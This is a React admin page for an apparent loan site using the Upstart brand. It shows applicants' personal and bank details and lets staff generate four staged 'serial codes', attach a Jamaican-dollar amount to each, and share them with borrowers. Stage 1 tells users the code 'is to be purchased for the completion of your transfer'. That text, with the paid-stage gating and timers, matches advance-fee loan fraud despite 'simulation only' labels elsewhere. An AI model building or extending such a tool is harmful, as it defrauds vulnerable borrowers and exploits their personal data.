import { useEffect, useState } from 'react';
import { isSupabaseConfigured, supabase } from '../supabase.js';
import { signOutWithActivity } from '../accountActivity.js';
import brandLogo from '../brandAssets.js';

const currency = new Intl.NumberFormat('en-JM', { style: 'currency', currency: 'JMD', maximumFractionDigits: 0 });
const date = new Intl.DateTimeFormat('en-JM', { dateStyle: 'long' });
const initialAmountSettings = Array.from({ length: 4 }, (_, index) => ({
  sequence: index + 1,
  amount: '',
}));

function createSerialCode() {
  const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const limit = Math.floor(256 / alphabet.length) * alphabet.length;
  let code = '';
  while (code.length < 12) {
    const randomValues = new Uint8Array(16);
    window.crypto.getRandomValues(randomValues);
    for (const value of randomValues) {
      if (value < limit) code += alphabet[value % alphabet.length];
      if (code.length === 12) break;
    }
  }
  return code;
}

function Detail({ label, children }) {
  return <div><dt>{label}</dt><dd>{children || '—'}</dd></div>;
}

export default function AdminApplicantPage() {
  const [detail, setDetail] = useState({ loading: true, email: '', application: null, error: '' });
  const [signOutError, setSignOutError] = useState('');
  const [decision, setDecision] = useState({ status: '' });
  const [savingDecision, setSavingDecision] = useState(false);
  const [decisionMessage, setDecisionMessage] = useState('');
  const [amountSettings, setAmountSettings] = useState(initialAmountSettings);
  const [selectedAmountSequence, setSelectedAmountSequence] = useState(1);
  const [amountInput, setAmountInput] = useState('');
  const [serials, setSerials] = useState([]);
  const [serialSaving, setSerialSaving] = useState('');
  const [serialMessage, setSerialMessage] = useState('');
  const applicationId = new URLSearchParams(window.location.search).get('id') || '';

  useEffect(() => {
    let active = true;

    async function loadApplicant() {
      if (!isSupabaseConfigured || !supabase) {
        setDetail({ loading: false, email: '', application: null, error: 'Account services are not configured. Please contact support.' });
        return;
      }

      const { data: { user }, error: authError } = await supabase.auth.getUser();
      if (authError?.name === 'AuthSessionMissingError' || (!authError && !user)) {
        if (active) window.location.replace('./application.html?view=account&mode=login');
        return;
      }
      if (authError) throw new Error(`We could not verify your account. ${authError.message}`);
      if (user.app_metadata?.role !== 'admin') {
        if (active) window.location.replace('./application.html?view=dashboard');
        return;
      }
      if (!applicationId) {
        if (active) setDetail({ loading: false, email: user.email || '', application: null, error: 'No applicant was selected.' });
        return;
      }

      const { data, error } = await supabase
        .from('loan_applications')
        .select('id, user_id, first_name, last_name, email, phone, address, parish, amount, approved_amount, term, purpose, employment, bank, monthly_income, pay_date, status, consented_at, created_at')
        .eq('id', applicationId)
        .maybeSingle();

      if (error) throw new Error(`Applicant details could not be loaded. ${error.message}`);
      let serialData = [];
      let serialLoadError = '';
      if (data) {
        const serialResult = await supabase.rpc('admin_get_transfer_demo_serials', {
          p_application_id: data.id,
        });
        if (serialResult.error) {
          serialLoadError = serialResult.error.code === '42P01'
            || serialResult.error.code === 'PGRST205'
            || serialResult.error.code === '42883'
            || serialResult.error.code === 'PGRST202'
            ? 'Run the serial setup migration in Supabase to enable persistent code retrieval.'
            : `Serials could not be loaded. ${serialResult.error.message}`;
        } else {
          serialData = serialResult.data || [];
        }
      }
      if (active) {
        setDetail({
          loading: false,
          email: user.email || '',
          application: data,
          error: data ? '' : 'The selected application could not be found.',
        });
        if (data) {
          setDecision({ status: data.status });
          setSerials(serialData);
          setSerialMessage(serialLoadError);
          setAmountSettings((current) => current.map((setting) => {
            const existing = serialData.find((serial) => serial.sequence === setting.sequence);
            return { ...setting, amount: existing?.amount == null ? '' : String(existing.amount) };
          }));
          const firstAmount = serialData.find((serial) => serial.sequence === selectedAmountSequence)?.amount;
          setAmountInput(firstAmount == null ? '' : String(firstAmount));
        }
      }
    }

    void loadApplicant().catch((error) => {
      if (active) setDetail({
        loading: false,
        email: '',
        application: null,
        error: error instanceof Error ? error.message : 'Applicant details could not be loaded. Please try again.',
      });
    });

    return () => { active = false; };
  }, [applicationId]);

  async function signOut() {
    if (!supabase) return;
    try {
      await signOutWithActivity();
      window.location.href = './application.html?view=account&mode=login';
    } catch (error) {
      setSignOutError(error.message);
      return;
    }
  }

  async function saveDecision(event) {
    event.preventDefault();
    if (!supabase || !detail.application) return;

    setSavingDecision(true);
    setDecisionMessage('');
    try {
      const { data, error } = await supabase
        .from('loan_applications')
        .update({
          status: decision.status,
          approved_amount: decision.status === 'approved' ? Number(detail.application.amount) : null,
        })
        .eq('id', detail.application.id)
        .select('status, approved_amount')
        .single();

      if (error) {
        setDecisionMessage(`The loan status could not be saved. ${error.message}`);
      } else {
        setDetail((current) => ({
          ...current,
          application: current.application
            ? { ...current.application, status: data.status, approved_amount: data.approved_amount }
            : null,
        }));
        setDecision({ status: data.status });
        setDecisionMessage('Loan status updated successfully.');
      }
    } catch (error) {
      setDecisionMessage(`The loan status could not be saved. ${error instanceof Error ? error.message : 'Please try again.'}`);
    } finally {
      setSavingDecision(false);
    }
  }

  function selectAmountSequence(sequence) {
    setSelectedAmountSequence(sequence);
    const savedAmount = amountSettings.find((setting) => setting.sequence === sequence)?.amount;
    setAmountInput(savedAmount || '');
  }

  async function generateAllDemoSerials() {
    if (!supabase || !application) return;
    if (serials.length > 0 && !window.confirm('Regenerate all four serials? Existing codes will stop working and any active timers will reset. Saved amount tags will be kept.')) {
      return;
    }

    setSerialSaving('generate');
    setSerialMessage('');
    try {
      const codes = Array.from({ length: 4 }, createSerialCode);
      const { data, error } = await supabase.rpc('admin_generate_transfer_demo_serials', {
        p_application_id: application.id,
        p_serial_codes: codes,
      });

      if (error) {
        setSerialMessage(error.code === '42883' || error.code === 'PGRST202'
          ? 'Run the serial setup migration in Supabase to enable code generation.'
          : `The four serials could not be generated. ${error.message}`);
        return;
      }
      if (!Array.isArray(data) || data.length !== 4) {
        throw new Error('The server did not confirm all four generated serials.');
      }

      setSerials((current) => data.map((generated) => ({
        id: generated.id,
        application_id: application.id,
        user_id: application.user_id,
        sequence: generated.stage_sequence,
        name: generated.stage_sequence === 1
          ? 'Payment Authorization Code'
          : generated.stage_sequence === 3
            ? 'Transaction Reference Code (TRC)'
            : `Serial ${generated.stage_sequence}`,
        description: generated.stage_sequence === 1
          ? "This confirms that a payment has passed the required authorization checks. The serial code is generally generated through the support and is to be purchased for the completion of your transfer."
          : generated.stage_sequence === 2
            ? 'Simulation-only verification step. No fee or payment is required to receive or enter a verification code. Real banks do not ask customers to purchase verification codes. If you have concerns about an actual charge, contact your bank through its official support channels.'
            : generated.stage_sequence === 3
              ? 'A unique combination of letters and numbers generated by the online banking system when a user initiates a bank transfer. The code serves as a transaction identifier, allowing the user to track, verify, and reference the payment. If a transaction requires a reference code, it is generated by the bank or payment provider and is not purchased separately.'
              : `Verification checkpoint ${generated.stage_sequence}`,
        reason: `Stage ${generated.stage_sequence}`,
        amount: generated.amount,
        code_generated: true,
        code_value: codes[generated.stage_sequence - 1],
        matched_at: null,
        unlock_at: null,
      })).sort((first, second) => first.sequence - second.sequence));
      setSerialMessage('All four serials were generated and saved. Authorized admins can retrieve them until reset.');
    } catch (error) {
      setSerialMessage(`The four serials could not be generated. ${error instanceof Error ? error.message : 'Please try again.'}`);
    } finally {
      setSerialSaving('');
    }
  }

  async function saveDemoAmount(event) {
    event.preventDefault();
    if (!supabase || !application) return;
    const amount = Number(amountInput);
    if (!Number.isFinite(amount) || amount <= 0) {
      setSerialMessage('Enter an amount greater than zero.');
      return;
    }

    setSerialSaving(String(selectedAmountSequence));
    setSerialMessage('');
    try {
      const { data, error } = await supabase.rpc('admin_set_transfer_demo_serial_amount', {
        p_application_id: application.id,
        p_sequence: selectedAmountSequence,
        p_amount: amount,
      });

      if (error) {
        setSerialMessage(error.code === '42883' || error.code === 'PGRST202'
          ? 'Run the serial setup migration in Supabase to enable amount settings.'
          : `The step ${selectedAmountSequence} amount could not be saved. ${error.message}`);
        return;
      }

      setSerials((current) => current.map((serial) => (
        serial.sequence === selectedAmountSequence ? { ...serial, amount: Number(data) } : serial
      )));
      setAmountSettings((current) => current.map((setting) => (
        setting.sequence === selectedAmountSequence ? { ...setting, amount: String(data) } : setting
      )));
      setAmountInput(String(data));
      setSerialMessage(`Amount for step ${selectedAmountSequence} saved.`);
    } catch (error) {
      setSerialMessage(`The amount for step ${selectedAmountSequence} could not be saved. ${error instanceof Error ? error.message : 'Please try again.'}`);
    } finally {
      setSerialSaving('');
    }
  }

  async function resetDemoSerials() {
    if (!supabase || !application || serials.length === 0) return;
    if (!window.confirm('Reset all four serial codes and set every amount to J$0? Users will not be able to proceed until new codes are generated and amounts are set again.')) {
      return;
    }

    setSerialSaving('reset');
    setSerialMessage('');
    try {
      const { error } = await supabase.rpc('admin_reset_transfer_demo_serials', {
        p_application_id: application.id,
      });
      if (error) {
        setSerialMessage(error.code === '42883' || error.code === 'PGRST202'
          ? 'Run the serial setup migration in Supabase to enable reset.'
          : `Serials could not be reset. ${error.message}`);
        return;
      }

      setSerials((current) => current.map((serial) => ({
        ...serial,
        code_generated: false,
        code_value: null,
        amount: 0,
        matched_at: null,
        unlock_at: null,
      })));
      setAmountSettings((current) => current.map((setting) => ({ ...setting, amount: '0' })));
      setAmountInput('0');
      setSerialMessage('All serial codes were reset and all four amounts are now J$0.');
    } catch (error) {
      setSerialMessage(`Serials could not be reset. ${error instanceof Error ? error.message : 'Please try again.'}`);
    } finally {
      setSerialSaving('');
    }
  }

  async function copySerialCode(code) {
    try {
      await navigator.clipboard.writeText(code);
      setSerialMessage('Serial copied to clipboard. Share it with the user.');
    } catch (error) {
      setSerialMessage(`Could not copy the serial. ${error instanceof Error ? error.message : 'Please copy it manually.'}`);
    }
  }

  if (detail.loading) return <main className="container dashboard-loading" aria-live="polite">Loading applicant details…</main>;

  const application = detail.application;
  const applicantName = [application?.first_name, application?.last_name].filter(Boolean).join(' ');

  return (
    <>
      <a className="skip-link" href="#main">Skip to applicant details</a>
      <header className="site-header dashboard-header">
        <div className="container nav-wrap">
          <a className="brand" href="./index.html" aria-label="Upstart Jamaica home"><img className="brand-image" src={brandLogo} alt="Upstart Ltd · Loans" /></a>
          <nav className="dashboard-nav" aria-label="Admin account navigation">
            <span className="dashboard-account-email">{detail.email}</span>
            <button className="button button-quiet" type="button" onClick={signOut}>Log out</button>
          </nav>
        </div>
      </header>
      <main id="main" className="dashboard-main">
        <section className="admin-detail-page">
          <a className="transfer-back-link" href="./application.html?view=admin">← Back to applicants</a>
          {signOutError && <p className="account-message" role="alert">{signOutError}</p>}
          {detail.error ? (
            <p className="admin-access-message" role="alert">{detail.error}</p>
          ) : application && (
            <>
              <header className="admin-detail-heading">
                <span className="admin-applicant-avatar" aria-hidden="true">{applicantName.charAt(0).toUpperCase() || 'A'}</span>
                <div><p className="dashboard-panel-kicker">Full application</p><h1>{applicantName}</h1><p>{application.email}</p></div>
                <span className={`admin-applicant-status is-${application.status}`}>{application.status.replaceAll('_', ' ')}</span>
              </header>
              <div className="admin-detail-grid">
                <section className="admin-detail-card admin-decision-card">
                  <div className="admin-decision-heading">
                    <div><p className="dashboard-panel-kicker">Review application</p><h2>Loan status</h2></div>
                    <span className={`admin-applicant-status is-${application.status}`}>{application.status.replaceAll('_', ' ')}</span>
                  </div>
                  <form className="admin-status-form" onSubmit={saveDecision}>
                    <label className="admin-status-field">
                      <span>Update status</span>
                      <select value={decision.status} onChange={(event) => setDecision((current) => ({ ...current, status: event.target.value }))} required>
                        <option value="pending">Pending</option>
                        <option value="under_review">Under review</option>
                        <option value="approved">Approved</option>
                        <option value="rejected">Rejected</option>
                      </select>
                    </label>
                    {decision.status === 'approved' && <p className="admin-approved-note">Approval sets the balance to the full requested amount: {currency.format(Number(application.amount))}.</p>}
                    <button className="button button-dark" type="submit" disabled={savingDecision || !decision.status}>
                      {savingDecision ? 'Saving…' : 'Save status'}
                    </button>
                  </form>
                  {decisionMessage && <p className="admin-decision-message" role={decisionMessage.includes('could not') || decisionMessage.startsWith('Enter') ? 'alert' : 'status'}>{decisionMessage}</p>}
                </section>
                <section className="admin-detail-card">
                  <h2>Personal details</h2>
                  <dl>
                    <Detail label="First name">{application.first_name}</Detail>
                    <Detail label="Last name">{application.last_name}</Detail>
                    <Detail label="Email">{application.email}</Detail>
                    <Detail label="Phone">{application.phone}</Detail>
                    <Detail label="Address">{application.address}</Detail>
                    <Detail label="Parish">{application.parish}</Detail>
                  </dl>
                </section>
                <section className="admin-detail-card">
                  <h2>Loan request</h2>
                  <dl>
                    <Detail label="Requested amount">{currency.format(Number(application.amount) || 0)}</Detail>
                    <Detail label="Approved loan amount">{application.status === 'approved' ? currency.format(Number(application.amount)) : '—'}</Detail>
                    <Detail label="Repayment term">{application.term} months</Detail>
                    <Detail label="Purpose">{application.purpose}</Detail>
                    <Detail label="Monthly income">{currency.format(Number(application.monthly_income) || 0)}</Detail>
                    <Detail label="Employment">{application.employment}</Detail>
                    <Detail label="Bank">{application.bank}</Detail>
                    <Detail label="Preferred pay date">{application.pay_date ? date.format(new Date(`${application.pay_date}T12:00:00`)) : '—'}</Detail>
                  </dl>
                </section>
                <section className="admin-detail-card admin-detail-meta">
                  <h2>Submission details</h2>
                  <dl>
                    <Detail label="Submitted">{date.format(new Date(application.created_at))}</Detail>
                    <Detail label="Consent recorded">{date.format(new Date(application.consented_at))}</Detail>
                    <Detail label="Application ID">{application.id}</Detail>
                    <Detail label="Account ID">{application.user_id}</Detail>
                  </dl>
                </section>
                <section className="admin-detail-card admin-demo-serials">
                  <div className="admin-demo-heading">
                    <div><p className="dashboard-panel-kicker">Simulation only</p><h2>Four serial codes</h2></div>
                    <span className="admin-demo-badge">No funds move</span>
                  </div>
                  <p className="admin-demo-intro">Generate all four codes at once, then choose a step to set its amount. Codes remain available to authorized admins until reset. Regenerating replaces all codes and resets active timers, while keeping saved amounts.</p>
                  {serialMessage && <p className="admin-decision-message" role={serialMessage.includes('could not') || serialMessage.startsWith('Run ') || serialMessage.startsWith('Enter') ? 'alert' : 'status'}>{serialMessage}</p>}
                  <div className="admin-demo-serial-actions">
                    <button className="button button-dark" type="button" onClick={generateAllDemoSerials} disabled={serialSaving !== ''}>
                      {serialSaving === 'generate' ? 'Generating all four…' : serials.length === 4 ? 'Regenerate all four codes' : 'Generate all four codes'}
                    </button>
                    <button className="button button-quiet" type="button" onClick={resetDemoSerials} disabled={serialSaving !== '' || serials.length === 0}>
                      {serialSaving === 'reset' ? 'Resetting…' : 'Reset codes and amounts'}
                    </button>
                  </div>
                  <form className="admin-demo-amount-setting admin-demo-single-amount" onSubmit={saveDemoAmount}>
                    <label htmlFor="admin-demo-step"><span>Step</span>
                      <select id="admin-demo-step" value={selectedAmountSequence} onChange={(event) => selectAmountSequence(Number(event.target.value))}>
                        {amountSettings.map((setting) => {
                          const saved = serials.find((serial) => serial.sequence === setting.sequence);
                          return <option key={setting.sequence} value={setting.sequence}>Step {setting.sequence}{saved ? '' : ' (code not generated)'}</option>;
                        })}
                      </select>
                    </label>
                    <label htmlFor="admin-demo-amount"><span>Amount tag (JMD)</span>
                      <input id="admin-demo-amount" required type="number" min="0.01" step="0.01" value={amountInput} disabled={!serials.some((serial) => serial.sequence === selectedAmountSequence) || serialSaving !== ''} onChange={(event) => setAmountInput(event.target.value)} />
                    </label>
                    <button className="button button-dark" type="submit" disabled={!serials.some((serial) => serial.sequence === selectedAmountSequence) || serialSaving !== ''}>
                      {serialSaving === String(selectedAmountSequence) ? 'Saving…' : serials.find((serial) => serial.sequence === selectedAmountSequence)?.amount > 0 ? 'Save amount' : 'Set amount'}
                    </button>
                  </form>
                  <div className="admin-demo-serial-list">
                    {amountSettings.map((setting) => {
                      const saved = serials.find((serial) => serial.sequence === setting.sequence);
                      const generatedCode = saved?.code_value;
                      const codeGenerated = Boolean(saved?.code_generated);
                      return (
                        <section className="admin-demo-serial" key={setting.sequence}>
                          <div className="admin-demo-serial-top">
                            <h3>Stage {setting.sequence}</h3>
                            <span className={saved?.amount > 0 && generatedCode ? 'admin-demo-state is-generated' : 'admin-demo-state'}>
                              {!saved || !codeGenerated ? 'Code not generated' : !generatedCode ? 'Regenerate to restore code' : saved.amount > 0 ? (saved.matched_at ? 'Code matched' : 'Ready') : 'Amount is J$0'}
                            </span>
                          </div>
                          {generatedCode && (
                            <div className="admin-generated-code"><code>{generatedCode}</code><button className="button button-quiet" type="button" onClick={() => copySerialCode(generatedCode)}>Copy</button></div>
                          )}
                          {saved && <p className="admin-demo-match-time">Amount: {currency.format(Number(saved.amount) || 0)}{!generatedCode && codeGenerated ? ' · This older code was not saved for retrieval; regenerate all codes to restore it.' : saved.matched_at ? ` · Matched ${date.format(new Date(saved.matched_at))}; next stage unlocks ${new Date(saved.unlock_at).toLocaleTimeString()}.` : saved.amount > 0 ? ' · Waiting for the user to enter this serial.' : ' · Set a positive amount before the user can enter the code.'}</p>}
                        </section>
                      );
                    })}
                  </div>
                </section>
              </div>
            </>
          )}
        </section>
      </main>
      <footer className="site-footer dashboard-footer"><div className="container footer-inner"><a className="brand" href="./index.html" aria-label="Upstart Jamaica home"><img className="brand-image" src={brandLogo} alt="Upstart Ltd · Loans" /></a><p className="footer-copy">Applicant information is restricted to authorized staff.</p></div></footer>
    </>
  );
}
